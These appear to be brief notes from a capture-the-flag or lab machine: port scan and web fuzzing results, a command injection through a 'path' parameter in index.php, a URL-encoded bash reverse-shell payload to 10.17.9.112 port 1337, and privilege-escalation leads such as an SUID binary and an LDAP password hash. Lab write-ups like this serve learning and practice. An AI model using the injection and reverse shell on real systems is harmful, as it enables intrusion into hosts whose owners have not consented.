start with nmap

port

8022 ssh 
80
2222

****

http 80

site uses php.

```
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
index.php               [Status: 200, Size: 329, Words: 54, Lines: 17]
info.php                [Status: 200, Size: 69037, Words: 3292, Lines: 760]


```
/index.php listed the some directory.

comment in /index.php `<!--  where is the path ?  -->`

directory listing found on /index.php?path=/

cmd execution found on 

/index.php?path=/;whoami

got shell : `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.17.9.112%2F1337%200%3E%261%22`

***

privs 

/usr/share/man/zh_TW/crypt : suid bit set.


[+] Looking for ldap directories and their hashes                                                                     
/etc/ldap                                                                                                             
The password hash is from the {SSHA} to 'structural'    



Found readable /etc/cloud/cloud.cfg

/usr/bin/gettext.sh

/home/mike/.bash_history

/usr/config